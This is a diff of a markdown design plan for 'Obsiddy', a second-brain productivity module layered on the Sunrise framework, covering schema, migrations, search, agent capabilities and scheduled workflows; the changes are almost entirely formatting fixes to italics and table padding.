@@ -18,23 +18,23 @@ Nothing productivity-shaped exists in the repo yet — `prisma/schema/app.prisma
 
 Obsidian cannot be the system of record here, because the things you asked for are queries a folder of markdown cannot answer: ranking tasks by a weighted score, nearest-neighbour search over embeddings, scheduled background jobs that run whether or not your laptop is open, and per-item access grants. Sunrise already ships the machinery for all four.
 
-But markdown files are the right *interchange* format, and since you want this usable by other people, Obsidian round-tripping is a genuine product feature — an on-ramp, an off-ramp, and a daily editing surface for people who already live in a vault.
+But markdown files are the right _interchange_ format, and since you want this usable by other people, Obsidian round-tripping is a genuine product feature — an on-ramp, an off-ramp, and a daily editing surface for people who already live in a vault.
 
 Note this is the single most expensive decision in the plan. Two-way sync across three transports is roughly as much work as the entire rest of the system. It is sequenced so you get a shippable product long before you get all three transports.
 
 ### What Sunrise gives you for free
 
-| Need | Existing | Path |
-| --- | --- | --- |
-| Embeddings | `embedText` / `embedBatch`, active-model resolution, cost logging | `lib/orchestration/knowledge/embedder.ts` |
-| Hybrid vector+BM25 search | `runHybridSearch` SQL pattern to copy | `lib/orchestration/knowledge/search.ts` |
-| Agent tools | `BaseCapability`, `registerAppCapability` | `lib/orchestration/capabilities/` |
-| Background jobs | maintenance tick, 8 tasks under `Promise.allSettled` | `lib/orchestration/maintenance/run-tick.ts` |
-| Multi-agent planning | `orchestrator` step (planner recruits agents per round) | `lib/orchestration/engine/executors/orchestrator.ts` |
-| Email-to-inbox | Postmark inbound adapter | `lib/orchestration/inbound/adapters/postmark.ts` |
-| Per-turn context injection | `registerContextContributor` → `=== LOCKED CONTEXT ===` block | `lib/orchestration/chat/context-builder.ts` |
-| Sharing precedent | single read choke point, `revokedAt`/`expiresAt` | `lib/orchestration/access/conversation-access.ts` |
-| GDPR erasure | `registerErasureCleanupHook` | `lib/privacy/erasure-hooks.ts` |
+| Need                       | Existing                                                          | Path                                                 |
+| -------------------------- | ----------------------------------------------------------------- | ---------------------------------------------------- |
+| Embeddings                 | `embedText` / `embedBatch`, active-model resolution, cost logging | `lib/orchestration/knowledge/embedder.ts`            |
+| Hybrid vector+BM25 search  | `runHybridSearch` SQL pattern to copy                             | `lib/orchestration/knowledge/search.ts`              |
+| Agent tools                | `BaseCapability`, `registerAppCapability`                         | `lib/orchestration/capabilities/`                    |
+| Background jobs            | maintenance tick, 8 tasks under `Promise.allSettled`              | `lib/orchestration/maintenance/run-tick.ts`          |
+| Multi-agent planning       | `orchestrator` step (planner recruits agents per round)           | `lib/orchestration/engine/executors/orchestrator.ts` |
+| Email-to-inbox             | Postmark inbound adapter                                          | `lib/orchestration/inbound/adapters/postmark.ts`     |
+| Per-turn context injection | `registerContextContributor` → `=== LOCKED CONTEXT ===` block     | `lib/orchestration/chat/context-builder.ts`          |
+| Sharing precedent          | single read choke point, `revokedAt`/`expiresAt`                  | `lib/orchestration/access/conversation-access.ts`    |
+| GDPR erasure               | `registerErasureCleanupHook`                                      | `lib/privacy/erasure-hooks.ts`                       |
 
 ### Verified facts that changed the design
 
@@ -53,26 +53,26 @@ Note this is the single most expensive decision in the plan. Two-way sync across
 
 `CUSTOMIZATION.md:70-80` reserves **two** fork tiers, and the plan was aimed at the wrong one:
 
-| Tier | For | Owns |
-| --- | --- | --- |
-| `/app` (leaf) | fork Sunrise, build one product | `lib/app/**`, `.context/app/`, `prisma/schema/app.prisma` |
+| Tier             | For                                                         | Owns                                                                                                           |
+| ---------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
+| `/app` (leaf)    | fork Sunrise, build one product                             | `lib/app/**`, `.context/app/`, `prisma/schema/app.prisma`                                                      |
 | **`/framework`** | **a reusable layer between Sunrise and its own leaf forks** | **`lib/framework/`, `.context/framework/`, `prisma/schema/framework-*.prisma`, the `framework_` table prefix** |
 
 Obsiddy is the second. **Sunrise core never creates files or tables under either tier**, so both merge cleanly on upgrade — that guarantee is the whole point, and it only holds if we stay inside the tier.
 
 ### Placement
 
-| Concern | Path |
-| --- | --- |
-| Code | `lib/framework/obsiddy/**` |
-| Schema | `prisma/schema/framework-obsiddy.prisma` |
-| Tables | `framework_obsiddy_*` (e.g. `@@map("framework_obsiddy_task")`) |
-| Docs | `.context/framework/obsiddy/**` |
-| Seeds | `prisma/seeds/framework-obsiddy/001-*.ts` onward |
-| Routes | `app/(protected)/obsiddy/**`, `app/api/v1/obsiddy/**` |
-| Components | `components/obsiddy/**` |
+| Concern    | Path                                                           |
+| ---------- | -------------------------------------------------------------- |
+| Code       | `lib/framework/obsiddy/**`                                     |
+| Schema     | `prisma/schema/framework-obsiddy.prisma`                       |
+| Tables     | `framework_obsiddy_*` (e.g. `@@map("framework_obsiddy_task")`) |
+| Docs       | `.context/framework/obsiddy/**`                                |
+| Seeds      | `prisma/seeds/framework-obsiddy/001-*.ts` onward               |
+| Routes     | `app/(protected)/obsiddy/**`, `app/api/v1/obsiddy/**`          |
+| Components | `components/obsiddy/**`                                        |
 
-**Namespaced inside the tier, not at its root.** `prisma/schema/framework-*.prisma` is a *glob*, so several framework modules coexist. A project already running another framework layer (Daybreak, say) can add Obsiddy as a sibling — `lib/framework/daybreak/` and `lib/framework/obsiddy/` — rather than colliding on the tier root. Never put anything directly in `lib/framework/` except the tier's own `eslint.config.mjs`.
+**Namespaced inside the tier, not at its root.** `prisma/schema/framework-*.prisma` is a _glob_, so several framework modules coexist. A project already running another framework layer (Daybreak, say) can add Obsiddy as a sibling — `lib/framework/daybreak/` and `lib/framework/obsiddy/` — rather than colliding on the tier root. Never put anything directly in `lib/framework/` except the tier's own `eslint.config.mjs`.
 
 ### Seed numbering — the earlier plan was wrong
 
@@ -84,16 +84,16 @@ An earlier draft said "seeds start at 021, since `020-agent-initial-versions.ts`
 
 The plan currently requires editing three Sunrise-owned files. For a one-off product that's a footnote; for a portable module it's poison — every host project would have to repeat them, and each is an upstream merge conflict waiting to happen.
 
-| Core edit | Fix |
-| --- | --- |
-| `lib/orchestration/maintenance/run-tick.ts` (vault sweep, retention) | **Add `lib/app/maintenance-tasks.ts`** (`registerAppMaintenanceTask({name, run})`, ~30 lines) and upstream it. Was "recommended"; for a portable module it is **required** |
-| `components/layouts/protected-nav.tsx` (one nav entry) | No seam exists — `lib/app/admin-nav.ts` covers admin nav only. **Upstream a matching `lib/app/protected-nav.ts`.** Until then it's one documented line in the install guide |
-| `app/robots.ts` (`/s/` disallow) | **Don't require it.** Per-page `robots` metadata plus `X-Robots-Tag` on the API route are the stronger controls anyway (robots.txt is advisory and doesn't de-index). Ship those; list the robots.txt line as an optional host step |
+| Core edit                                                            | Fix                                                                                                                                                                                                                                 |
+| -------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `lib/orchestration/maintenance/run-tick.ts` (vault sweep, retention) | **Add `lib/app/maintenance-tasks.ts`** (`registerAppMaintenanceTask({name, run})`, ~30 lines) and upstream it. Was "recommended"; for a portable module it is **required**                                                          |
+| `components/layouts/protected-nav.tsx` (one nav entry)               | No seam exists — `lib/app/admin-nav.ts` covers admin nav only. **Upstream a matching `lib/app/protected-nav.ts`.** Until then it's one documented line in the install guide                                                         |
+| `app/robots.ts` (`/s/` disallow)                                     | **Don't require it.** Per-page `robots` metadata plus `X-Robots-Tag` on the API route are the stronger controls anyway (robots.txt is advisory and doesn't de-index). Ship those; list the robots.txt line as an optional host step |
 
 ### Boot, env and lint wiring
 
-- **Boot.** `instrumentation.ts` calls `initApp()` in `lib/app/bootstrap.ts`. Obsiddy is booted from there with a **dynamic** import — `await import('@/lib/framework/obsiddy')`. `CUSTOMIZATION.md:281` is explicit that a *static* framework specifier is resolved at `next build` and **breaks the build in any fork without that folder**. Obsiddy's boot then delegates to a fresh leaf hook (`lib/app/leaf-bootstrap.ts`) so a project building on Obsiddy can still hook boot without fighting over `bootstrap.ts`.
-- **Env.** `appEnvSchema` in `lib/app/env.ts` is the *leaf* seam. Obsiddy exports `obsiddyEnvSchema` from its tier and the host merges it in one line, rather than Obsiddy owning a file the host also wants.
+- **Boot.** `instrumentation.ts` calls `initApp()` in `lib/app/bootstrap.ts`. Obsiddy is booted from there with a **dynamic** import — `await import('@/lib/framework/obsiddy')`. `CUSTOMIZATION.md:281` is explicit that a _static_ framework specifier is resolved at `next build` and **breaks the build in any fork without that folder**. Obsiddy's boot then delegates to a fresh leaf hook (`lib/app/leaf-bootstrap.ts`) so a project building on Obsiddy can still hook boot without fighting over `bootstrap.ts`.
+- **Env.** `appEnvSchema` in `lib/app/env.ts` is the _leaf_ seam. Obsiddy exports `obsiddyEnvSchema` from its tier and the host merges it in one line, rather than Obsiddy owning a file the host also wants.
 - **Lint.** Obsiddy's import boundary (`lib/framework/obsiddy/repo/*` must not import `…/access/*`, D5) lives in `lib/framework/eslint.config.mjs`, which the root config spreads **before** the leaf seam. Remember flat-config `no-restricted-imports` **replaces rather than merges** — any block Obsiddy adds must restate the base `@/`-alias ban for its glob or relative-import enforcement silently dies there.
 - **Registrations.** Every `lib/app/*.ts` seam Obsiddy needs (`capabilities`, `context-contributors`, `protected-routes`, `db-drift`, `rate-limit`, `admin-nav`) is a **leaf** file. Obsiddy exports a ready-made contribution from its tier and the install guide is one import plus one spread per seam — never "paste this body in".
 
@@ -117,13 +117,13 @@ Roughly a day of extra plumbing, all in phases 0–1, plus the discipline of nev
 
 **D1 — One satellite table, everything else hangs off it.** `ObsiddySpace` carries `userId String @unique` with a hand-written FK to `"user"("id") ON DELETE CASCADE`. Every other `framework_obsiddy_*` table carries `userId` relating to `ObsiddySpace.userId` with `onDelete: Cascade`. One unmodelled FK to drift-probe instead of a dozen; `userId` natively on every row for scoped queries; erasure cascades transitively. Never add columns to `User` (CLAUDE.md).
 
-**D2 — Typed entity tables + one polymorphic edge table + one polymorphic embedding table.** Tasks/projects/goals have different required fields and different query shapes, so no generic node graph. But *connections* are polymorphic (`ObsiddyLink`) and *embeddings* are polymorphic (`ObsiddyEmbedding`) — which means one `vector(1536)` column, one HNSW index, one re-embed path, one search query. Cuts the pgvector migration-drift surface ~5×.
+**D2 — Typed entity tables + one polymorphic edge table + one polymorphic embedding table.** Tasks/projects/goals have different required fields and different query shapes, so no generic node graph. But _connections_ are polymorphic (`ObsiddyLink`) and _embeddings_ are polymorphic (`ObsiddyEmbedding`) — which means one `vector(1536)` column, one HNSW index, one re-embed path, one search query. Cuts the pgvector migration-drift surface ~5×.
 
 **D3 — Prioritisation is deterministic code, not an LLM.** Pure function in `lib/framework/obsiddy/priority/score.ts`, persisted to `priorityScore`, so list endpoints are one indexed `ORDER BY` with zero per-request compute. The LLM chooses among the top ~10 and writes rationales; it never produces a number that lands in the column.
 
-**D4 — Connection-finding is embedding-to-embedding, not LLM-over-corpus.** The background sweep reads *already-stored* vectors and does nearest-neighbour pairs in SQL at zero token cost. An LLM writes rationales only for pairs clearing the similarity floor. This is what makes proactive background connection-hunting affordable to run forever.
+**D4 — Connection-finding is embedding-to-embedding, not LLM-over-corpus.** The background sweep reads _already-stored_ vectors and does nearest-neighbour pairs in SQL at zero token cost. An LLM writes rationales only for pairs clearing the similarity floor. This is what makes proactive background connection-hunting affordable to run forever.
 
-**D5 — Every brain query is either an owner query or a shared query. There is no third kind.** Owner queries are `WHERE userId = $1` with no joins and no resolution. Shared queries opt in explicitly and go through `resolveObsiddyAccess`. Enforced structurally: `lib/framework/obsiddy/repo/*` takes an `OwnerScope` and *cannot express* a cross-user read; cross-user code lives in `lib/framework/obsiddy/access/*`. **Adopt this before sync or sharing exist** — retrofitting it is what causes leaks.
+**D5 — Every brain query is either an owner query or a shared query. There is no third kind.** Owner queries are `WHERE userId = $1` with no joins and no resolution. Shared queries opt in explicitly and go through `resolveObsiddyAccess`. Enforced structurally: `lib/framework/obsiddy/repo/*` takes an `OwnerScope` and _cannot express_ a cross-user read; cross-user code lives in `lib/framework/obsiddy/access/*`. **Adopt this before sync or sharing exist** — retrofitting it is what causes leaks.
 
 ---
 
@@ -131,30 +131,30 @@ Roughly a day of extra plumbing, all in phases 0–1, plus the discipline of nev
 
 All tables `@@map("obsiddy_*")`, all with `userId` and a `@@index([userId, …])` leading with `userId`.
 
-| Model | Purpose | Notes |
-| --- | --- | --- |
-| `ObsiddySpace` | one row per user | `inboxToken @unique` (email routing), `timezone`, `weeklyCapacityMinutes`, `energyProfile Json`, `priorityWeights Json`, `retentionPolicy Json` (§11), **`workStyle`** = `structured\|balanced\|exploratory` (default `balanced`, see §6). **The only table needing an FK drift probe.** |
-| `ObsiddyArea` | life domains (Health, Career…) | `targetWeeklyMinutes` — this is what makes it a *life* organiser, not a task list |
-| `ObsiddyGoal` | horizons | `horizon` = `life\|year\|quarter\|month\|week`, `parentGoalId` self-relation `SetNull`, `areaId SetNull` |
-| `ObsiddyProject` | | `status`, `areaId SetNull`, `priorityScore`, `lastActivityAt`, `snoozedUntil` |
-| `ObsiddyTask` | | `projectId` **`SetNull`** (deleting a project must not destroy tasks — they fall back to inbox), `dueAt`, `deferUntil`, `estimateMinutes`, `energy`, `contextTag`, `priorityScore`, `priorityFactors Json`, `manualBoost Float @default(0)` + `manualBoostExpiresAt DateTime?` + `manualBoostReason String?` (§10). `deferUntil` doubles as snooze; `snoozeCount Int @default(0)` + `lastSnoozedAt` (§10). Generated `searchVector` |
-| `ObsiddyThought` | capture inbox | `source` = `web\|pwa\|voice\|image\|shortcut\|email\|chat\|agent\|api`, `externalId` for replay dedupe (`@@unique([userId, externalId])`), `snoozedUntil`, `snoozeCount`, `lastSnoozedAt` |
-| `ObsiddyLink` | polymorphic edge | `sourceType/sourceId/targetType/targetId/kind/strength/rationale/origin/status`, `snoozedUntil`, `@@unique` on the tuple. No FKs to targets |
-| `ObsiddyEmbedding` | the one vector table | `entityType/entityId/chunkIndex`, `embedding vector(1536)`, generated `searchVector`, `contentHash`, model provenance |
-| `ObsiddyBoard` | a named, shareable kanban view | `name`, `slug` (`@@unique([userId, slug])`), `columns Json` (ordered list of `{status, label, wipLimit?}`), `membership` = `filter\|explicit`, `filter Json?`, `swimlaneBy?` (`project\|area\|entity\|none`), `visibility`, `archivedAt`. See §12 |
-| `ObsiddyBoardCard` | explicit board membership | `boardId`, `taskId`, `position Float`. Only used when `membership: 'explicit'`. `@@unique([boardId, taskId])` |
-| `ObsiddyTag` | Trello-style coloured labels | `name`, `slug` (`@@unique([userId, slug])`), `colour`, `sortOrder`. A table, not a `String[]` — see §12 |
-| `ObsiddyTaskTag` | task ↔ tag join | `@@unique([taskId, tagId])`, `@@index([tagId])` |
-| `ObsiddyChecklistItem` | sub-steps within a card | `taskId` (`onDelete: Cascade`), `text`, `isDone`, `position Float`, `completedAt?`. `@@index([taskId, position])` |
-| `ObsiddyEntity` | people, companies, market segments | `name`, `slug` (`@@unique([userId, slug])`), `kind` = `person\|company\|segment`, `description Text?`, `website?`, `status`, `lastActivityAt`, `snoozedUntil`, `indexedHash`. **First-class, not an Area** — see below |
-| `ObsiddyDocument` | uploaded reference material | `title`, `fileName`, `fileHash`, `mimeType`, `storageKey`, `byteSize`, `status` = `processing\|ready\|failed`, `chunkCount`, `sourceUrl?`, `errorMessage?`, `extractedText Text?`. Chunks land in `ObsiddyEmbedding` with `chunkIndex` |
-| `ObsiddyTimeBlock` | planned/actual time | feeds `effortFit` and the "organise my time" requirement |
-| `ObsiddyReview` | generated artefacts | how background workflows persist output the UI can render |
-| `ObsiddyEvent` | append-only activity log | the weekly review needs "what actually moved"; scanning `updatedAt` across five tables is the wrong answer |
+| Model                  | Purpose                            | Notes                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| ---------------------- | ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `ObsiddySpace`         | one row per user                   | `inboxToken @unique` (email routing), `timezone`, `weeklyCapacityMinutes`, `energyProfile Json`, `priorityWeights Json`, `retentionPolicy Json` (§11), **`workStyle`** = `structured\|balanced\|exploratory` (default `balanced`, see §6). **The only table needing an FK drift probe.**                                                                                                                                            |
+| `ObsiddyArea`          | life domains (Health, Career…)     | `targetWeeklyMinutes` — this is what makes it a _life_ organiser, not a task list                                                                                                                                                                                                                                                                                                                                                   |
+| `ObsiddyGoal`          | horizons                           | `horizon` = `life\|year\|quarter\|month\|week`, `parentGoalId` self-relation `SetNull`, `areaId SetNull`                                                                                                                                                                                                                                                                                                                            |
+| `ObsiddyProject`       |                                    | `status`, `areaId SetNull`, `priorityScore`, `lastActivityAt`, `snoozedUntil`                                                                                                                                                                                                                                                                                                                                                       |
+| `ObsiddyTask`          |                                    | `projectId` **`SetNull`** (deleting a project must not destroy tasks — they fall back to inbox), `dueAt`, `deferUntil`, `estimateMinutes`, `energy`, `contextTag`, `priorityScore`, `priorityFactors Json`, `manualBoost Float @default(0)` + `manualBoostExpiresAt DateTime?` + `manualBoostReason String?` (§10). `deferUntil` doubles as snooze; `snoozeCount Int @default(0)` + `lastSnoozedAt` (§10). Generated `searchVector` |
+| `ObsiddyThought`       | capture inbox                      | `source` = `web\|pwa\|voice\|image\|shortcut\|email\|chat\|agent\|api`, `externalId` for replay dedupe (`@@unique([userId, externalId])`), `snoozedUntil`, `snoozeCount`, `lastSnoozedAt`                                                                                                                                                                                                                                           |
+| `ObsiddyLink`          | polymorphic edge                   | `sourceType/sourceId/targetType/targetId/kind/strength/rationale/origin/status`, `snoozedUntil`, `@@unique` on the tuple. No FKs to targets                                                                                                                                                                                                                                                                                         |
+| `ObsiddyEmbedding`     | the one vector table               | `entityType/entityId/chunkIndex`, `embedding vector(1536)`, generated `searchVector`, `contentHash`, model provenance                                                                                                                                                                                                                                                                                                               |
+| `ObsiddyBoard`         | a named, shareable kanban view     | `name`, `slug` (`@@unique([userId, slug])`), `columns Json` (ordered list of `{status, label, wipLimit?}`), `membership` = `filter\|explicit`, `filter Json?`, `swimlaneBy?` (`project\|area\|entity\|none`), `visibility`, `archivedAt`. See §12                                                                                                                                                                                   |
+| `ObsiddyBoardCard`     | explicit board membership          | `boardId`, `taskId`, `position Float`. Only used when `membership: 'explicit'`. `@@unique([boardId, taskId])`                                                                                                                                                                                                                                                                                                                       |
+| `ObsiddyTag`           | Trello-style coloured labels       | `name`, `slug` (`@@unique([userId, slug])`), `colour`, `sortOrder`. A table, not a `String[]` — see §12                                                                                                                                                                                                                                                                                                                             |
+| `ObsiddyTaskTag`       | task ↔ tag join                    | `@@unique([taskId, tagId])`, `@@index([tagId])`                                                                                                                                                                                                                                                                                                                                                                                     |
+| `ObsiddyChecklistItem` | sub-steps within a card            | `taskId` (`onDelete: Cascade`), `text`, `isDone`, `position Float`, `completedAt?`. `@@index([taskId, position])`                                                                                                                                                                                                                                                                                                                   |
+| `ObsiddyEntity`        | people, companies, market segments | `name`, `slug` (`@@unique([userId, slug])`), `kind` = `person\|company\|segment`, `description Text?`, `website?`, `status`, `lastActivityAt`, `snoozedUntil`, `indexedHash`. **First-class, not an Area** — see below                                                                                                                                                                                                              |
+| `ObsiddyDocument`      | uploaded reference material        | `title`, `fileName`, `fileHash`, `mimeType`, `storageKey`, `byteSize`, `status` = `processing\|ready\|failed`, `chunkCount`, `sourceUrl?`, `errorMessage?`, `extractedText Text?`. Chunks land in `ObsiddyEmbedding` with `chunkIndex`                                                                                                                                                                                              |
+| `ObsiddyTimeBlock`     | planned/actual time                | feeds `effortFit` and the "organise my time" requirement                                                                                                                                                                                                                                                                                                                                                                            |
+| `ObsiddyReview`        | generated artefacts                | how background workflows persist output the UI can render                                                                                                                                                                                                                                                                                                                                                                           |
+| `ObsiddyEvent`         | append-only activity log           | the weekly review needs "what actually moved"; scanning `updatedAt` across five tables is the wrong answer                                                                                                                                                                                                                                                                                                                          |
 
 **Embedded types:** `thought`, `project`, `goal`, `area`, `entity`, `document`. **Not `task`** — titles are short, high-churn and semantically thin; a tsvector on the task table gives better recall for less money.
 
-**Why `ObsiddyEntity` is not just an Area.** An Area is a *domain of your life* with a weekly time target, and `areaBalance` (§10) deliberately floats neglected ones upward. A client is not that — balancing attention across customers the way you balance Health against Career is wrong, and overloading Areas would corrupt the scorer. Entities are therefore a separate node type that is **deliberately absent from `score.ts`**; neglected clients surface through the stale digest (§11), not by inflating task scores. This is what makes "what should we do for Acme this quarter?" the same connection query as everything else, just pointed at a different node.
+**Why `ObsiddyEntity` is not just an Area.** An Area is a _domain of your life_ with a weekly time target, and `areaBalance` (§10) deliberately floats neglected ones upward. A client is not that — balancing attention across customers the way you balance Health against Career is wrong, and overloading Areas would corrupt the scorer. Entities are therefore a separate node type that is **deliberately absent from `score.ts`**; neglected clients surface through the stale digest (§11), not by inflating task scores. This is what makes "what should we do for Acme this quarter?" the same connection query as everything else, just pointed at a different node.
 
 **Entities and documents connect via `ObsiddyLink`, not FK columns.** A project can serve several clients; a document can be relevant to several projects. Adding `entityId` to `ObsiddyProject` would force a primary-client fiction and give the codebase two relationship mechanisms. The edge table already handles polymorphic many-to-many — use it (D2).
 
@@ -177,7 +177,7 @@ One migration `add_second_brain`, generated `--create-only` then **hand-edited**
 3. `CREATE INDEX idx_framework_obsiddy_embedding_hnsw … USING hnsw (embedding vector_cosine_ops) WITH (m = 16, ef_construction = 64)` plus GIN indexes on both tsvectors. Copy parameters from `idx_knowledge_embedding` in the baseline.
 4. Hand-written FK: `ALTER TABLE framework_obsiddy_space ADD CONSTRAINT framework_obsiddy_space_userId_fkey FOREIGN KEY ("userId") REFERENCES "user"("id") ON DELETE CASCADE;` (User is mapped to lowercase `"user"`).
 
-**The drift trap.** Every future `migrate dev` emits DROPs for all five raw-SQL objects plus the FK, and a dropped HNSW index degrades *silently* to seq-scan with no error. Two mandatory mitigations:
+**The drift trap.** Every future `migrate dev` emits DROPs for all five raw-SQL objects plus the FK, and a dropped HNSW index degrades _silently_ to seq-scan with no error. Two mandatory mitigations:
 
 - Copy the `⚠️ PRISMA-SCHEMA DRIFT WARNING ⚠️` comment-block convention from `prisma/schema/orchestration-knowledge.prisma:85-117` onto `ObsiddyEmbedding` and `ObsiddyTask`.
 - Register six probes in `lib/app/db-drift.ts` via `registerAppDriftProbe` + `constraintExists`/`indexExists`/`columnExists` from `lib/db/drift-probes` — including a definition assertion that the FK really is `ON DELETE CASCADE` (that one is the GDPR guard). `npm run db:drift-check` then fails CI the moment any is dropped. **This is the highest-value regression guard in the build.**
@@ -194,13 +194,13 @@ All `withAuth`, `validateRequestBody`, `successResponse`, thrown errors from `li
 
 Enriched single-call endpoints (CLAUDE.md forbids N+1 client fetches):
 
-| Endpoint | Returns in ONE call |
-| --- | --- |
-| `GET /obsiddy/today` | ranked tasks (+project, +area, +factors), today's time blocks, inbox count, goals at risk, unreviewed links, latest review. ETag'd via `computeETag`/`checkConditional`. **The dashboard's only fetch.** |
-| `GET /obsiddy/inbox` | thoughts + `suggestedLinks[]` + `suggestedProjectId`, resolved with one grouped query |
-| `GET /obsiddy/projects` | + `openTaskCount`, `nextAction`, `linkedGoals[]`, `daysSinceActivity`, `priorityScore` |
-| `GET /obsiddy/tasks` | + project, area, score, factors; paginated + sortable |
-| `GET /obsiddy/goals` | full tree nested by `parentGoalId` + linked counts |
+| Endpoint                | Returns in ONE call                                                                                                                                                                                      |
+| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `GET /obsiddy/today`    | ranked tasks (+project, +area, +factors), today's time blocks, inbox count, goals at risk, unreviewed links, latest review. ETag'd via `computeETag`/`checkConditional`. **The dashboard's only fetch.** |
+| `GET /obsiddy/inbox`    | thoughts + `suggestedLinks[]` + `suggestedProjectId`, resolved with one grouped query                                                                                                                    |
+| `GET /obsiddy/projects` | + `openTaskCount`, `nextAction`, `linkedGoals[]`, `daysSinceActivity`, `priorityScore`                                                                                                                   |
+| `GET /obsiddy/tasks`    | + project, area, score, factors; paginated + sortable                                                                                                                                                    |
+| `GET /obsiddy/goals`    | full tree nested by `parentGoalId` + linked counts                                                                                                                                                       |
 
 Mutations: `POST /obsiddy/capture`, CRUD pairs for thoughts/tasks/projects/goals/areas/entities/time-blocks, `POST /obsiddy/thoughts/[id]/promote`, `GET/POST /obsiddy/links` + `PATCH /obsiddy/links/[id]`, `GET /obsiddy/search`, `POST /obsiddy/reindex`, `GET/PATCH /obsiddy/space`, `GET /obsiddy/reviews`, `POST /obsiddy/chat/stream`.
 
@@ -220,7 +220,7 @@ Rate limiting: `/api/v1/**` already inherits 100/min via `proxy.ts`. Add sub-cap
 
 **`lib/framework/obsiddy/search/hybrid-search.ts`** — `searchObsiddy({ userId, query, entityTypes?, limit, threshold })`, copying `runHybridSearch` from `lib/orchestration/knowledge/search.ts`. `e."userId" = $N` is always the first WHERE condition and always a **bound parameter**, never interpolated; make it structurally impossible to omit by having `searchObsiddy` be the only export and `userId` a required field. Hydrate results batched by type, one `findMany` per type. **Port `assertActiveModelMatchesStoredVectors()`** against `framework_obsiddy_embedding.embeddingDimension` — without it a model swap becomes a cryptic SQL cast crash.
 
-**`lib/framework/obsiddy/search/connections.ts`** — `findConnections()` reads the source row's *stored* vector and orders by `<=>` over the same user's other entities, excluding self and existing links. `sweepConnections(userId)` runs it across projects, goals, entities **and thought-to-thought pairs**, writing `ObsiddyLink{ origin:'rule', status:'suggested', strength }` above a 0.72 floor. Zero embedding cost.
+**`lib/framework/obsiddy/search/connections.ts`** — `findConnections()` reads the source row's _stored_ vector and orders by `<=>` over the same user's other entities, excluding self and existing links. `sweepConnections(userId)` runs it across projects, goals, entities **and thought-to-thought pairs**, writing `ObsiddyLink{ origin:'rule', status:'suggested', strength }` above a 0.72 floor. Zero embedding cost.
 
 **Thought-to-thought is where article and podcast ideas come from** — two half-formed fragments captured six weeks apart that turn out to be the same idea. Projects and goals are already well-formed, so their collisions are less surprising. Cap the thought pass to the last 180 days of non-archived thoughts or the pair count grows quadratically.
 
@@ -242,7 +242,7 @@ Each extends `BaseCapability`, sets `processesPii = true` and **overrides `redac
 
 `obsiddy_search` takes `entityTypes[]`, so documents and entities are searchable through the existing tool — no separate document-search capability.
 
-**`obsiddy_ideate({ seedType, seedId, angle?, count? })`** is the deliberate counterpart to the passive sweep. The nightly job *notices* connections; this is you asking for them: it pulls the seed's nearest neighbours across all embedded types, then asks the LLM for N distinct framings — article angles, podcast topics, campaign ideas for a client. Read-only: it returns suggestions and writes nothing. Without it the system only ever surfaces connections on its own schedule, which is a filing cabinet rather than a thinking partner.
+**`obsiddy_ideate({ seedType, seedId, angle?, count? })`** is the deliberate counterpart to the passive sweep. The nightly job _notices_ connections; this is you asking for them: it pulls the seed's nearest neighbours across all embedded types, then asks the LLM for N distinct framings — article angles, podcast topics, campaign ideas for a client. Read-only: it returns suggestions and writes nothing. Without it the system only ever surfaces connections on its own schedule, which is a filing cabinet rather than a thinking partner.
 
 Four-step pipeline each: TS class → `registerAppCapability` in `lib/app/capabilities.ts` → `AiCapability` seed row → `AiAgentCapability` binding. Model seeds on `prisma/seeds/011-call-external-api.ts` (upsert by slug; the update branch only sets `isSystem` so re-seeding never clobbers admin edits). **Seed numbering starts at 021** — `020-agent-initial-versions.ts` is the current max.
 
@@ -256,7 +256,7 @@ All five share a seeded **`obsiddy-core` `AiAgentProfile`** carrying the persona
 
 `lib/framework/obsiddy/context/contributor.ts` → `registerContextContributor('obsiddy', loadObsiddyContext)` in `lib/app/context-contributors.ts`. The loader **ignores `id` and reads `request.userId`**, returning `''` if absent — a shared cache partition must never leak another user's goals.
 
-Contents, in order, each section truncated: today's date + timezone + week number; life & year goals; current month + week goals with target dates; active projects with next action and days-since-activity; top 5 tasks with dominant factor; inbox backlog, remaining capacity, most-neglected area. **Hard-cap at ~1200 tokens** — this is injected on *every* turn and otherwise grows unbounded. Every mutating service calls `invalidateContext('obsiddy', userId, { userId })`.
+Contents, in order, each section truncated: today's date + timezone + week number; life & year goals; current month + week goals with target dates; active projects with next action and days-since-activity; top 5 tasks with dominant factor; inbox backlog, remaining capacity, most-neglected area. **Hard-cap at ~1200 tokens** — this is injected on _every_ turn and otherwise grows unbounded. Every mutating service calls `invalidateContext('obsiddy', userId, { userId })`.
 
 ### App-owned chat route
 
@@ -270,13 +270,13 @@ Workflows seeded as `AiWorkflow` rows + `createInitialVersion`, following `prism
 
 **The userId mechanism (verified):** `processDueSchedules` stamps `execution.userId = schedule.createdBy` (`scheduler.ts:314`), and the engine threads that into `CapabilityContext.userId` (`executors/tool-call.ts:102`). So one schedule row per user with `createdBy = userId` is exactly how a background workflow acts on the right person's data, with no userId ever in an LLM-visible argument.
 
-| Workflow | Cron | Steps |
-| --- | --- | --- |
-| `obsiddy-nightly-triage` | `15 3 * * *` | reindex → `agent_call obsiddy-triage` → `obsiddy_reprioritise` → daily review → **pre-compute tomorrow's briefing** → notify |
-| `obsiddy-connection-finder` | `0 4 * * 0` | deterministic sweep (free) → **`orchestrator`** → connections review → notify |
-| `obsiddy-weekly-review` | `0 16 * * 5` | snapshot → `llm_call` (moved / stalled / at risk vs month+quarter goals) → `reflect` → review → notify |
-| `obsiddy-horizon-check` | `0 9 1 * *` | snapshot → `llm_call` → `judge_call` scoring each goal 0–1 on evidenced activity → `guard` flags < 0.3 → month review |
-| `obsiddy-capture-intake` | inbound | `obsiddy_capture_for_token` → `agent_call obsiddy-triage` single-thought mode |
+| Workflow                    | Cron         | Steps                                                                                                                        |
+| --------------------------- | ------------ | ---------------------------------------------------------------------------------------------------------------------------- |
+| `obsiddy-nightly-triage`    | `15 3 * * *` | reindex → `agent_call obsiddy-triage` → `obsiddy_reprioritise` → daily review → **pre-compute tomorrow's briefing** → notify |
+| `obsiddy-connection-finder` | `0 4 * * 0`  | deterministic sweep (free) → **`orchestrator`** → connections review → notify                                                |
